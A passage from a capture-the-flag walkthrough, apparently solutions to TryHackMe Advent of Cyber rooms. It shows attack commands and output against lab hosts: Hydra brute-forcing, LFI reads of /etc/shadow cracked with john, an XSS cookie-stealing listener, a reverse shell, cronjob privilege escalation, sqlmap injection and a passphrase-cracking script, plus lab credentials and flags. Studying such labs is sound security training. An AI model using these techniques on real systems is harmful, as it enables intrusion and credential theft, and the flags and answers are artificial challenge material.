  ~~~bash
  meterpreter > cd /home/santa 
  meterpreter > ls
  Listing: /home/santa
  ====================
  
  Mode              Size  Type  Last modified              Name
  ----              ----  ----  -------------              ----
  100644/rw-r--r--  30    fil   2019-12-08 22:12:44 +0100  ssh-creds.txt
  
  meterpreter > cat ssh-creds.txt 
  santa:rudolphrednosedreindeer
  ~~~

  rudolphrednosedreindeer

- Who is on line 148 of the naughty list?

  **Solution:**

  ~~~bash
  $ ssh santa@10.10.130.244
  santa@10.10.130.244's password: 
  Last login: Fri Sep 18 21:15:41 2020 from ip-10-9-90-233.eu-west-1.compute.internal
  
        \         /   \         /   \         /   \         /
        _\/     \/_   _\/     \/_   _\/     \/_   _\/     \/_
         _\-'"'-/_     _\-'"'-/_     _\-'"'-/_     _\-'"'-/_
        (_,     ,_)   (_,     ,_)   (_,     ,_)   (_,     ,_)
          | ^ ^ |       | o o |       | a a |       | 6 6 |
          |     |       |     |       |     |       |     |
          |     |       |     |       |     |       |     |
          |  Y  |       |  @  |       |  O  |       |  V  |
          `._|_.'       `._|_.'       `._|_.'       `._|_.'
           Dasher        Dancer       Prancer        Vixen
        \         /   \         /   \         /   \         /
        _\/     \/_   _\/     \/_   _\/     \/_   _\/     \/_
         _\-'"'-/_     _\-'"'-/_     _\-'"'-/_     _\-'"'-/_
        (_,     ,_)   (_,     ,_)   (_,     ,_)   (_,     ,_)
          | q p |       | @ @ |       | 9 9 |       | d b |
          |     |       |     |       |     |       |     |
          |     |       |     |       |  _  |       |     |
          | \_/ |       |  V  |       | (_) |       |  0  |
          `._|_.'       `._|_.'       `._|_.'       `._|_.'
           Comet         Cupid         Donder       Blitzen
                             \         /
                             _\/     \/_
                              _\-'"'-/_
                             (_,     ,_)
                               | e e |
                               |     |
                          '-.  |  _  |  .-'
                         --=   |((@))|   =--
                          .-'  `._|_.'  '-.
                               Rudolph
  
  [santa@ip-10-10-130-244 ~]$ ls
  naughty_list.txt  nice_list.txt
  [santa@ip-10-10-130-244 ~]$ head -148 naughty_list.txt | tail -1
  Melisa Vanhoose
  ~~~

  Melisa Vanhoose

- Who is on line 52 of the nice list?

  **Solution:**

  ~~~bash
  [santa@ip-10-10-130-244 ~]$ head -52 nice_list.txt | tail -1
  Lindsey Gaffney
  ~~~

  Lindsey Gaffney

---

### [Task 16] [Day 11] Elf Applications

- What is the password inside the creds.txt file?

  **Solution:**

  ~~~bash
  $ nmap 10.10.123.193
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 17:04 CEST
  Nmap scan report for 10.10.123.193
  Host is up (0.042s latency).
  Not shown: 995 closed ports
  PORT     STATE SERVICE
  21/tcp   open  ftp
  22/tcp   open  ssh
  111/tcp  open  rpcbind
  2049/tcp open  nfs
  3306/tcp open  mysql
  
  Nmap done: 1 IP address (1 host up) scanned in 1.72 seconds
  $ cd ..
  $ sudo mkdir nfs
  $ sudo mount 10.10.123.193:/opt/files /home/nfs
  $ cd nfs/
  $ ls
  creds.txt
  $ cat creds.txt 
  the password is securepassword123
  ~~~

  securepassword123

- What is the name of the file running on port 21?

  **Solution:**

  ~~~bash
  $ ftp 10.10.123.193
  Connected to 10.10.123.193.
  220 (vsFTPd 3.0.2)
  331 Please specify the password.
  Password:
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> ls
  200 PORT command successful. Consider using PASV.
  150 Here comes the directory listing.
  -rwxrwxrwx    1 0        0              39 Dec 10  2019 file.txt <--
  drwxr-xr-x    2 0        0               6 Nov 04  2019 pub
  d-wx-wx--x    2 14       50              6 Nov 04  2019 uploads
  -rw-r--r--    1 0        0             224 Nov 04  2019 welcome.msg
  226 Directory send OK.
  ~~~

file.txt

- What is the password after enumerating the database?

  **Solution:**

  ~~~bash
  ftp> recv file.txt
  local: file.txt remote: file.txt
  200 PORT command successful. Consider using PASV.
  150 Opening BINARY mode data connection for file.txt (39 bytes).
  226 Transfer complete.
  39 bytes received in 0.00 secs (21.7386 kB/s)
  $ cat file.txt 
  remember to wipe mysql:
  root
  ff912ABD*
  $ mysql -u root -h 10.10.123.193 -p
  Enter password: 
  Welcome to the MariaDB monitor.  Commands end with ; or \g.
  Your MySQL connection id is 7
  Server version: 5.7.28 MySQL Community Server (GPL)
  
  Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
  
  Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
  
  MySQL [(none)]> show databases;
  +--------------------+
  | Database           |
  +--------------------+
  | information_schema |
  | data               |
  | mysql              |
  | performance_schema |
  | sys                |
  +--------------------+
  5 rows in set (0.040 sec)
  
  MySQL [(none)]> use data
  Reading table information for completion of table and column names
  You can turn off this feature to get a quicker startup with -A
  MySQL [data]> show tables;
  +----------------+
  | Tables_in_data |
  +----------------+
  | USERS          |
  +----------------+
  1 row in set (0.040 sec)
  
  MySQL [data]> SELECT * FROM USERS;
  +-------+--------------+
  | name  | password     |
  +-------+--------------+
  | admin | bestpassword |
  +-------+--------------+
  1 row in set (0.296 sec)
  ~~~

  bestpassword

---

### [Task 17] [Day 12] Elfcryption

*Given file: tosend.zip*

- What is the md5 hashsum of the encrypted note1 file?

  **Solution:**

  ~~~bash
  $ md5sum note1.txt.gpg 
  24cf615e2a4f42718f2ff36b35614f8f  note1.txt.gpg
  ~~~

  24cf615e2a4f42718f2ff36b35614f8f

- Where was elf Bob told to meet Alice?

  **Solution:**

  ~~~bash
  $ echo 25daysofchristmas | gpg --batch --yes --passphrase-fd 0 note1.txt.gpg 
  gpg: WARNING: no command supplied.  Trying to guess what you mean ...
  gpg: AES encrypted data
  gpg: encrypted with 1 passphrase
  $ cat note1.txt
  I will meet you outside Santa's Grotto at 5pm!
  ~~~

  ######*Note: Use the hint to get the pass phrase*

  Santa's Grotto

- Decrypt note2 and obtain the flag!

  **Solution:**

  ~~~python
  #!/usr/bin/env python3
  from subprocess import PIPE, Popen
  import subprocess
  import sys
  import pyfiglet
  
  def args ():
      print(pyfiglet.figlet_format("DattRSA"))
      print ("[i] DattRSA - RSA Dicctionary attack for pass phrase public/private openssl key.")
      print ("[?] Enter the path of the key: ", end="")
      path_key = input ()
      print ("[?] Enter the path of the dicctionary: ", end="")
      path_dic = input ()
      return path_key,path_dic
  
  def cmdline(command):
      proc = subprocess.Popen(str(command), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
      (out, err) = proc.communicate()
      return err
  
  def main (path_key,path_dic):
      words = [line.strip() for line in open(path_dic)]
      print("\n")
      count=0
  
      for w in words:
          strcmd = "openssl rsa -in " + path_key + " -out decrypted.key -passin pass:" + w
          res=cmdline(strcmd)
          if res.startswith(b'writing'):
                  print("\n[✓] The key is: "+w)
                  print("[✓] decrypted.key has been created")
                  sys.exit()
          print("[x] Nº" + str(count)+ " | " + str(w))
          count=count+1
      print("\n")
  
  if __name__ == '__main__':
      try:
          args = args()
          main(args[0],args[1])
      except Exception:
          print("[x] Something went wrong. Please check if you typed correctly the key/dicttionary path.")
  ~~~

  ~~~bash
  $ ./dattrsa.py 
   ____        _   _   ____  ____    _    
  |  _ \  __ _| |_| |_|  _ \/ ___|  / \   
  | | | |/ _` | __| __| |_) \___ \ / _ \  
  | |_| | (_| | |_| |_|  _ < ___) / ___ \ 
  |____/ \__,_|\__|\__|_| \_\____/_/   \_\
                                          
  
  [i] DattRSA - RSA Dicctionary attack for pass phrase public/private openssl key.
  [?] Enter the path of the key: /path/to/private.key
  [?] Enter the path of the dicctionary: /path/to/wordlist
  
  
  [x] Nº0 | 123456
  [x] Nº1 | 123456789
  [x] Nº2 | qwerty
  [x] Nº3 | password
          .
          .
          .
          .
  [✓] Nº194 | hello
  [✓] decrypted.key has been created
  $ ls
  dattrsa.py  decrypted.key
  $ openssl rsautl -decrypt -inkey ~/git/dattrsa/decrypted.key -in note2_encrypted.txt -out plaintext.txt
  $ ls
  note1.txt.gpg  note2_encrypted.txt  plaintext.txt  private.key
  $ cat plaintext.txt 
  THM{ed9ccb6802c5d0f905ea747a310bba23}
  ~~~

  THM{ed9ccb6802c5d0f905ea747a310bba23}

---

### [Task 18] [Day 13] Accumulate

- A web server is running on the target. What is the hidden directory which the website lives on?

  **Solution:**

  ~~~bash
  $ nmap 10.10.162.100 -p80,3389 -A | tee nmap.txt
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-20 14:41 CEST
  Nmap scan report for 10.10.162.100
  Host is up (0.038s latency).
  
  PORT     STATE SERVICE       VERSION
  80/tcp   open  http          Microsoft IIS httpd 10.0
  | http-methods: 
  |_  Potentially risky methods: TRACE
  |_http-server-header: Microsoft-IIS/10.0
  |_http-title: IIS Windows Server
  3389/tcp open  ms-wbt-server Microsoft Terminal Services
  | rdp-ntlm-info: 
  |   Target_Name: RETROWEB
  |   NetBIOS_Domain_Name: RETROWEB
  |   NetBIOS_Computer_Name: RETROWEB
  |   DNS_Domain_Name: RetroWeb
  |   DNS_Computer_Name: RetroWeb
  |   Product_Version: 10.0.14393
  |_  System_Time: 2020-09-20T12:41:39+00:00
  | ssl-cert: Subject: commonName=RetroWeb
  | Not valid before: 2020-05-21T21:44:38
  |_Not valid after:  2020-11-20T21:44:38
  |_ssl-date: 2020-09-20T12:41:40+00:00; -1s from scanner time.
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
  
  Host script results:
  |_clock-skew: mean: -1s, deviation: 0s, median: -1s
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.75 seconds
  
  $ gobuster dir -u http://10.10.162.100 -w /usr/share/wordlists/dirb/big.txt 
  ===============================================================
  Gobuster v3.0.1
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
  ===============================================================
  [+] Url:            http://10.10.162.100
  [+] Threads:        10
  [+] Wordlist:       /usr/share/wordlists/dirb/big.txt
  [+] Status codes:   200,204,301,302,307,401,403
  [+] User Agent:     gobuster/3.0.1
  [+] Timeout:        10s
  ===============================================================
  2020/09/20 14:51:36 Starting gobuster
  ===============================================================
  /retro (Status: 301)
  ===============================================================
  2020/09/20 14:53:04 Finished
  ===============================================================
  ~~~

  /retro

- Gain initial access and read the contents of user.txt

  **Solution:**

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_18_%232.png" alt="solution" style="zoom:150%;" />

  > *Username: Wade*
  >
  > *Password: parzival*
  >
  > *Domain: RetroWeb*

  Using  `remmina`

  ![solution](https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_18_%232.1.png)

  THM{HACK_PLAYER_ONE}

- [Optional] Elevate privileges and read the content of root.txt

  *Knowledge needed: <https://github.com/jas502n/CVE-2019-1388>*

  **Solution:**

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_18_%233.png" alt="solution" style="zoom:150%;" />

  

  Clicking on VeriSign link

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_18_%233.1.png" alt="solution" style="zoom:150%;" />

  

  Searching above path when saving the file

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_18_%233.2.png" alt="solution" style="zoom:150%;" />

  

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_18_%233.3.png" alt="solution" style="zoom:150%;" />

  

  THM{COIN_OPERATED_EXPLOITATION}

---

### [Task 19] [Day 14] Unknown Storage

*Data given:*

*s3 bucket name: advent-bucket-one*

- What is the name of the file you found?

  **Solution:**

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_19_%231.png"/>

  employee_names.txt

- What is in the file?

  **Solution:**

  ~~~bash
  $ wget http://advent-bucket-one.s3.amazonaws.com/employee_names.txt
  --2020-09-23 14:06:24--  http://advent-bucket-one.s3.amazonaws.com/employee_names.txt
  Resolving advent-bucket-one.s3.amazonaws.com (advent-bucket-one.s3.amazonaws.com)... 52.218.108.146
  Connecting to advent-bucket-one.s3.amazonaws.com (advent-bucket-one.s3.amazonaws.com)|52.218.108.146|:80... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 7 [text/plain]
  Saving to: ‘employee_names.txt’
  
  employee_names.txt               100%[========================================================>]       7  --.-KB/s    in 0s      
  
  2020-09-23 14:06:24 (15.0 KB/s) - ‘employee_names.txt’ saved [7/7]
  
  $ cat employee_names.txt 
  mcchef
  ~~~

  mcchef

---

### [Task 20] [Day 15] LFI

- What is Charlie going to book a holiday to?

  **Solution:**

- Read /etc/shadow and crack Charlies password.

  **Solution:**

  ~~~bash
  $ wget http://10.10.13.10/get-file/%2Fetc%2Fshadow 
  --2020-09-23 14:36:48--  http://10.10.13.10/get-file/%2Fetc%2Fshadow
  Connecting to 10.10.13.10:80... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 1062 (1.0K) [application/json]
  Saving to: ‘%2Fetc%2Fshadow’
  
  %2Fetc%2Fshadow                  100%[========================================================>]   1.04K  --.-KB/s    in 0s      
  
  2020-09-23 14:36:49 (77.3 MB/s) - ‘%2Fetc%2Fshadow’ saved [1062/1062]
  
  $ wget http://10.10.13.10/get-file/%2Fetc%2Fpasswd 
  --2020-09-23 14:56:33--  http://10.10.13.10/get-file/%2Fetc%2Fpasswd
  Connecting to 10.10.13.10:80... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 1736 (1.7K) [application/json]
  Saving to: ‘%2Fetc%2Fpasswd’
  
  %2Fetc%2Fpasswd                  100%[========================================================>]   1.70K  --.-KB/s    in 0s      
  
  2020-09-23 14:56:33 (271 MB/s) - ‘%2Fetc%2Fpasswd’ saved [1736/1736]
  
  #After formatting/renaming both downloaded files.
  
  $ unshadow passwd shadow > passwords.txt
  $ john passwords.txt 
  Using default input encoding: UTF-8
  Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
  Cost 1 (iteration count) is 5000 for all loaded hashes
  Will run 8 OpenMP threads
  Proceeding with single, rules:Single
  Press 'q' or Ctrl-C to abort, almost any other key for status
  Almost done: Processing the remaining buffered candidate passwords, if any.
  Warning: Only 2 candidates buffered for the current salt, minimum 32 needed for performance.
  Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
  password1        (charlie)
  1g 0:00:00:06 DONE 2/3 (2020-09-23 14:55) 0.1497g/s 2549p/s 2549c/s 2549C/s 123456..random
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed
  ~~~

  password1

- What is flag1.txt?

  **Solution:**

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_20_%233.png"/>

  **OR**

  ~~~bash
  $ nmap 10.10.13.10 -p22 
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-23 14:59 CEST
  Nmap scan report for 10.10.13.10
  Host is up (0.040s latency).
  
  PORT   STATE SERVICE
  22/tcp open  ssh
  
  Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
  $ ssh charlie@10.10.13.10
  The authenticity of host '10.10.13.10 (10.10.13.10)' can't be established.
  ECDSA key fingerprint is SHA256:4IZcwczXV1c2bE7GHJJZyPMph4qbWffDF+txofWjSyw.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '10.10.13.10' (ECDSA) to the list of known hosts.
  charlie@10.10.13.10's password: 
  Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)
  
   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:        https://ubuntu.com/advantage
  
  65 packages can be updated.
  32 updates are security updates.
  
  
  Last login: Fri Dec 13 21:44:29 2019 from 10.8.11.98
  charlie@ip-10-10-13-10:~$ ls
  flag1.txt
  charlie@ip-10-10-13-10:~$ cat flag1.txt 
  THM{4ea2adf842713ad3ce0c1f05ef12256d}
  ~~~

  THM{4ea2adf842713ad3ce0c1f05ef12256d}

---

### [Task 21] [Day 16] File Confusion

*Script created: Task_21.py*

~~~python
#!/usr/bin/env python3

import os, zipfile, exiftool, re

def unzip (path):
    head_path,tail_path = os.path.split(path)
    with zipfile.ZipFile(path,'r') as zip_file:
        zip_file.extractall(path=head_path)
        os.remove(path)
        sub_zip_file = zip_file.namelist()
        for i in range(0,len(sub_zip_file),1):
            if zipfile.is_zipfile(head_path +"/"+ sub_zip_file[i]):
                unzip(head_path +"/"+sub_zip_file[i])
            else:
                pass

def metadata (path):
    count = 0
    list_files = os.listdir(path)
    with exiftool.ExifTool() as et:
        metadata = et.get_metadata_batch(list_files)
    for d in metadata:
        if "XMP:Version" in d and d["XMP:Version"] == 1.1 :
            print("{}".format(d))
            count+=1
    print("\nNumber of files containing Version: 1.1 in their metadata: {}".format(count))

def password (path):
    list_text = os.listdir(path)
    for n,text in enumerate(list_text):
        print("\n{} | {}\n".format(n,list_text[n]))
        with open (text,'r') as txt:
            try:
                f = txt.readlines()
                for line in f:
                    new_line = line.strip('\n')
                    password = re.findall('password+',new_line)
                    if len(password) !=0:
                        print(new_line)
            except:
                print("No se puede leer")
            finally:
                pass

def main():
    selector = input("Select the function:\n 1:unzip the file\n 2:View if the metadata contains Version: 1.1\n 3:Search the password into those files\n> ")
    if selector == "1":
        unzip(unzip("/path/to/zip/"))
    if selector == "2":
        metadata ("/path/to/dir/")
    if selector == "3":
        password ("/path/to/dir/")

main()
~~~

- How many files did you extract(excluding all the .zip files)

  **Solution:**

  50

- How many files contain Version: 1.1 in their metadata?

  **Solution:**

  3

- Which file contains the password?

  **Solution:**

  dL6w.txt

---

### [Task 22] [Day 17] Hydra-ha-ha-haa

- Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)

  **Solution:**

  ~~~bash
  $ hydra -l molly -P ~/wordlist/rockyou.txt 10.10.185.167 http-post-form "/<login url>:username=^USER^&password=^PASS^:F=incorrect"
  Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 00:18:10
  [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
  [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344409 login tries (l:1/p:14344409), ~3586103 tries per task
  [DATA] attacking http-post-form://10.10.185.167:80/<login url>:username=^USER^&password=^PASS^:F=incorrect
  [80][http-post-form] host: 10.10.112.172   login: molly   password: joyness1994
  1 of 1 target successfully completed, 1 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-03 19:06:06
  ~~~

  THM{2673a7dd116de68e85c48ec0b1f2612e}

- Use Hydra to bruteforce molly's SSH password. What is flag 2?

  **Solution:**

  ~~~bash
  $ hydra -l molly -P ~/wordlist/rockyou.txt ssh://10.10.185.167
  Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-25 23:59:02
  [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
  [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344409 login tries (l:1/p:14344409), ~896526 tries per task
  [DATA] attacking ssh://10.10.185.167:22/
  [22][ssh] host: 10.10.185.167   login: molly   password: butterfly
  1 of 1 target successfully completed, 1 valid password found
  [WARNING] Writing restore file because 3 final worker threads did not complete until end.
  [ERROR] 3 targets did not resolve or could not be connected
  [ERROR] 0 target did not complete
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-25 23:59:16
  ~~~

  THM{c8eeb0468febbadea859baeb33b2541b}

---

### [Task 23] [Day 18] ELF JS

- What is the admin's authid cookie value?

  **Solution:**

  *After sign up/login*

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_23_%231.png" style="zoom:150%;" />

  ~~~bash
  $ sudo nc -lvkp 80
  listening on [any] 80 ...
  10.10.28.231: inverse host lookup failed: Unknown host
  connect to [10.9.90.233] from (UNKNOWN) [10.10.28.231] 51004
  GET /?authid=2564799a4e6689972f6d9e1c7b406f87065cbf65 HTTP/1.1
  Host: 10.9.90.233
  Connection: keep-alive
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
  Referer: http://localhost:3000/admin
  Accept-Encoding: gzip, deflate
  ~~~

  2564799a4e6689972f6d9e1c7b406f87065cbf65

---

### [Task 24] [Day 19] Commands

- What are the contents of the user.txt file?

  **Solution:**

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_24_%231.png" style="zoom:150%;" />

  

  ~~~bash
  $ nc -lvkp 3000
  listening on [any] 3000 ...
  10.10.183.204: inverse host lookup failed: Unknown host
  connect to [10.9.90.233] from (UNKNOWN) [10.10.183.204] 56266
  bash: no job control in this shell
  [root@ip-10-10-183-204 /]# ls
  ls
  bin
  boot
  data
  dev
  etc
  home
  lib
  lib64
  local
  media
  mnt
  opt
  proc
  root
  run
  sbin
  srv
  sys
  tmp
  usr
  var
  [root@ip-10-10-183-204 /]# cd home
  cd home
  [root@ip-10-10-183-204 home]# ls
  ls
  bestadmin
  ec2-user
  [root@ip-10-10-183-204 home]# cd bestadmin
  cd bestadmin
  [root@ip-10-10-183-204 bestadmin]# ls
  ls
  bin
  new-room
  run.sh
  user.txt
  [root@ip-10-10-183-204 bestadmin]# cat user.txt	
  cat user.txt
  5W7WkjxBWwhe3RNsWJ3Q
  ~~~

  5W7WkjxBWwhe3RNsWJ3Q

---

### [Task 25] [Day 20] Cronjob Privilege Escalation

- What port is SSH running on

  **Solution:**

  ~~~bash
  $ nmap 10.10.162.215 -sV
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 14:54 CEST
  Nmap scan report for 10.10.162.215
  Host is up (0.074s latency).
  Not shown: 999 closed ports
  PORT     STATE SERVICE VERSION
  4567/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 11.84 seconds
  
  ~~~

- Crack sam's password and read flag1.txt

  **Solution:**

  ~~~bash
  $ hydra -l sam -P ~/wordlist/rockyou.txt 10.10.162.215 ssh -s 4567
  Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 14:58:27
  [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
  [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344409 login tries (l:1/p:14344409), ~896526 tries per task
  [DATA] attacking ssh://10.10.162.215:4567/
  [4567][ssh] host: 10.10.162.215   login: sam   password: chocolate
  1 of 1 target successfully completed, 1 valid password found
  [WARNING] Writing restore file because 2 final worker threads did not complete until end.
  [ERROR] 2 targets did not resolve or could not be connected
  [ERROR] 0 target did not complete
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-26 14:58:42
  
  $ ssh sam@10.10.162.215 -p 4567
  The authenticity of host '[10.10.162.215]:4567 ([10.10.162.215]:4567)' can't be established.
  ECDSA key fingerprint is SHA256:vTkkUciWxY5eNx5F+Fg7V7d1pPaJPErOfZMcwArZ9Fs.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '[10.10.162.215]:4567' (ECDSA) to the list of known hosts.
  sam@10.10.162.215's password: 
         .---.
        /     \
        \.@-@./
        /`\_/`\
       //  _  \\
      | \     )|_
     /`\_`>  <_/ \
     \__/'---'\__/
       tryhackme
  Last login: Thu Dec 19 20:21:55 2019 from 89.241.198.95
  sam@ip-10-10-162-215:~$ ls
  flag1.txt
  sam@ip-10-10-162-215:~$ cat flag1.txt 
  THM{dec4389bc09669650f3479334532aeab}
  
  ~~~

  THM{dec4389bc09669650f3479334532aeab}

- Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2

  ~~~bash
  sam@ip-10-10-11-45:/home$ ls
  sam  scripts  ubuntu
  sam@ip-10-10-11-45:/home$ cd scripts/
  sam@ip-10-10-11-45:/home/scripts$ ls
  clean_up.sh  test.txt
  sam@ip-10-10-11-45:/home/scripts$ nano clean_up.sh 
  cat /home/ubuntu/flag2.txt | tee /home/sam/flag2.txt
  sam@ip-10-10-11-45:/home$ cd /home/sam/
  sam@ip-10-10-11-45:~$ cat flag2.txt 
  THM{b27d33705f97ba2e1f444ec2da5f5f61}
  ~~~

  THM{b27d33705f97ba2e1f444ec2da5f5f61}

---

### [Task 26] [Day 20] Cronjob Privilege Escalation

*Tool used: Ghidra*

<img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_26.png" style="zoom:150%;" />

- What is the value of local_ch when its corresponding movl instruction is called(first if multiple)?

  **Solution:**

  1

- What is the value of eax when the imull instruction is called?

  **Solution:**

  6

- What is the value of local_4h before eax is set to 0?

  **Solution:**

  6

---

### [Task 27]  [Day 22] If Santa, Then Christmas

*Tool used: Ghidra*

<img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_27.png" style="zoom:150%;" />

- What is the value of local_8h before the end of the main function?

  **Solution:**

  9 

  *Note: local_8h on Ghidra is named as local_10*

- What is the value of local_4h before the end of the main function?

  2

  *Note: local_4h on Ghidra is named as local_c*

---

### [Task 28]  [Day 23] LapLANd (SQL Injection)

- Which field is SQL injectable? Use the input name used in the HTML code.

  **Solution:**

  *Checking post format*

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_28_%231.png" style="zoom:150%;" />

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_28_%232.png" style="zoom:150%;" />

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_28_%233.png" style="zoom:150%;" />

  *Finding field injectable*

  ~~~bash
  $ python3 sqlmap.py -u http://10.10.29.192/register.php --data="log_email=hola&log_password=123&login_button=Login"
          ___
         __H__
   ___ ___["]_____ ___ ___  {1.4.9.23#dev}
  |_ -| . [)]     | .'| . |
  |___|_  [']_|_|_|__,|  _|
        |_|V...       |_|   http://sqlmap.org
  
  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
  
  [*] starting @ 00:08:03 /2020-10-01/
  
  [00:08:03] [INFO] testing connection to the target URL
  you have not declared cookie(s), while server wants to set its own ('PHPSESSID=pu8naunti2t...2cuok6bb2d'). Do you want to use those [Y/n] y
  [00:08:06] [INFO] testing if the target URL content is stable
  [00:08:06] [INFO] target URL content is stable
  [00:08:06] [INFO] testing if POST parameter 'log_email' is dynamic
  [00:08:06] [WARNING] POST parameter 'log_email' does not appear to be dynamic
  [00:08:06] [WARNING] heuristic (basic) test shows that POST parameter 'log_email' might not be injectable
  [00:08:07] [INFO] heuristic (XSS) test shows that POST parameter 'log_email' might be vulnerable to cross-site scripting (XSS) attacks
  [00:08:07] [INFO] testing for SQL injection on POST parameter 'log_email'
  [00:08:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
  [00:08:07] [WARNING] reflective value(s) found and filtering out
  [00:08:07] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
  [00:08:08] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
  [00:08:08] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
  [00:08:08] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
  [00:08:08] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
  [00:08:09] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
  [00:08:09] [INFO] testing 'Generic inline queries'
  [00:08:09] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
  [00:08:09] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
  [00:08:09] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
  [00:08:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
  [00:08:20] [INFO] POST parameter 'log_email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
  ~~~

  log_email

- What is Santa Claus' email address?

  **Solution:**

  ~~~bash
  $ python3 sqlmap.py -u http://10.10.29.192/register.php --data="log_email=hey&log_password=123&login_button=Login" --tables -D social -t users -C email --dump
          ___
         __H__
   ___ ___[.]_____ ___ ___  {1.4.9.23#dev}
  |_ -| . ["]     | .'| . |
  |___|_  [']_|_|_|__,|  _|
        |_|V...       |_|   http://sqlmap.org
  
  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
  
  [*] starting @ 01:12:56 /2020-10-01/
  
  [01:12:56] [INFO] setting file for logging HTTP traffic
